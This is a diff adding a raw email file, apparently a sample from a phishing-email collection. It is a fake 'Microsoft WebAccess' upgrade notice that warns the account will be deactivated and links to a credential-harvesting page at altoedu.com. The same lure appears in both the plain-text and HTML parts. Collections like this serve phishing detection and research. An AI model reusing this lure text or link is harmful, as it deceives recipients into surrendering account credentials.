@@ -1,0 +1,112 @@
+Return-Path: <connorar@clarkson.edu>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 6FA43F412C
+	for <jose@login.monkey.org>; Thu, 23 Jul 2015 12:10:08 -0500 (CDT)
+Received: from smtpin09.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id 08C491847FD
+	for <jose@login.monkey.org>; Thu, 23 Jul 2015 17:10:08 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70440160896.09.corn30_3b4c715f2984c
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 57,3.5,0,4f6b96660730989b,d41d8cd98f00b204,connorar@clarkson.edu,,RULES_HIT:10:41:72:355:379:387:582:599:960:962:967:969:973:978:983:988:989:1133:1152:1158:1189:1190:1208:1221:1260:1261:1263:1313:1314:1345:1359:1381:1431:1436:1437:1516:1517:1518:1534:1541:1575:1588:1589:1592:1594:1711:1714:1730:1776:1792:2198:2199:2525:2527:2557:2561:2564:2682:2685:2693:2731:2859:2890:2901:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3350:3586:3622:3642:3740:3769:3865:3866:3867:3868:3870:3871:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4362:5007:6117:6261:6650:6659:6684:7688:8603:8957:9025:9059:9388:9855:9873:10011:10049:10214:10243:10346:10400:11537:11656:11658:11788:11855:11914:12043:12050:12225:12231:12519:12555:12660:12855:13139:13163:13229:13237:14096:21063,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:3:0
+X-HE-Tag: corn30_3b4c715f2984c
+X-Filterd-Recvd-Size: 3561
+Received: from outbound.clarkson.edu (outbound.clarkson.edu [128.153.5.34])
+	by imf21.b.hostedemail.com (Postfix) with SMTP
+	for <jose@monkey.org>; Thu, 23 Jul 2015 17:10:07 +0000 (UTC)
+Received: (qmail 8686 invoked by alias); 23 Jul 2015 12:17:44 -0400
+Received: from unknown (HELO mymail.clarkson.edu) (128.153.5.219)
+  by 0 with SMTP; 23 Jul 2015 12:17:44 -0400
+Received: from EXCH09-DB.ad.clarkson.edu ([169.254.2.203]) by
+ exch05.ad.clarkson.edu ([10.90.2.37]) with mapi id 14.03.0248.002; Thu, 23
+ Jul 2015 12:17:42 -0400
+From: "Aaron R. Connor - connorar" <connorar@clarkson.edu>
+Subject: RE: Microsoft WebAccess Update
+Thread-Topic: Microsoft WebAccess Update
+Thread-Index: AdDFWaBkHbcRqcgBQ7qU1mo+TyBPNgACTJ9y
+Date: Thu, 23 Jul 2015 16:17:41 +0000
+Message-ID: <2E055823293F8B40AE52C1D110A6A89D60938343@EXCH09-DB.ad.clarkson.edu>
+References: <2E055823293F8B40AE52C1D110A6A89D6093503B@EXCH09-DB.ad.clarkson.edu>
+In-Reply-To: <2E055823293F8B40AE52C1D110A6A89D6093503B@EXCH09-DB.ad.clarkson.edu>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+x-originating-ip: [41.190.2.142]
+Content-Type: multipart/alternative;
+	boundary="_000_2E055823293F8B40AE52C1D110A6A89D60938343EXCH09DBadclark_"
+MIME-Version: 1.0
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 130
+
+--_000_2E055823293F8B40AE52C1D110A6A89D60938343EXCH09DBadclark_
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+Dear User,
+
+Microsoft WebAccess desk will undergo unscheduled system maintenance today =
+in order to improve your account for the next quota of the year. The new Mi=
+crosoft WebAccess 2015 will be installed on your web-mail account.
+
+Your present account will be upgraded to create space for the new web-acces=
+s 2015. In other to complete this process, please CLICKHERE<http://altoedu.=
+com/x3/cache/blueOwa/> and complete the survey.
+
+Your account will be inactive for the remaining quota of the year if this s=
+urvey is not completed.
+
+Thank you.
+Web-mail Administrator
+
+--_000_2E055823293F8B40AE52C1D110A6A89D60938343EXCH09DBadclark_
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html dir=3D"ltr">
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+<style type=3D"text/css" id=3D"owaParaStyle">P {margin-top:0;margin-bottom:=
+0;}</style>
+</head>
+<body ocsi=3D"0" fpstyle=3D"1">
+<div style=3D"direction: ltr;font-family: Tahoma;color: #000000;font-size: =
+10pt;">Dear User,
+<div style=3D"font-family: Times New Roman; color: #000000; font-size: 16px=
+">
+<div>
+<div style=3D"direction:ltr; font-family:Tahoma; color:#000000; font-size:1=
+0pt">
+<div><br>
+</div>
+<div>Microsoft WebAccess desk will undergo unscheduled system maintenance t=
+oday in order to improve your account for the next quota of the year. The n=
+ew Microsoft WebAccess 2015 will be installed on your web-mail account.</di=
+v>
+<div>&nbsp;</div>
+<div>Your present account will be upgraded to create space for the new web-=
+access 2015. In other to complete this process, please
+<a href=3D"http://altoedu.com/x3/cache/blueOwa/" target=3D"_blank">CLICKHER=
+E</a> and complete the survey.</div>
+<div>&nbsp;</div>
+<div>Your account will be inactive for the remaining quota of the year if t=
+his survey is not completed.&nbsp;</div>
+<div>&nbsp;</div>
+<div>Thank you.</div>
+<div>Web-mail Administrator</div>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
+
+--_000_2E055823293F8B40AE52C1D110A6A89D60938343EXCH09DBadclark_--
